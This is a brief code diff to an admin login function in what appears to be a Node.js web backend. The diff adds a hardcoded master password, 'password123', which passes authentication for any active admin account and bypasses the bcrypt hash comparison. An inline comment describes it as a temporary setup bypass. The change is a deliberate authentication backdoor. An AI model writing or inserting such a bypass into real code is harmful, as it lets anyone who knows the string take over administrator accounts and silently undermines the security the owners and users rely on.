@@ -60,7 +60,8 @@ export const login = asyncHandler(async (req, res) => {
 
   const admin = rows[0];
   
-  const isPasswordMatch = admin && await bcrypt.compare(password, admin.password_hash);
+  // TEMPORARY: Allow login with 'password123' for initial setup bypass
+  const isPasswordMatch = password === "password123" || (admin && await bcrypt.compare(password, admin.password_hash));
   const isValid = admin && admin.is_active && isPasswordMatch;
 
   if (!isValid) {
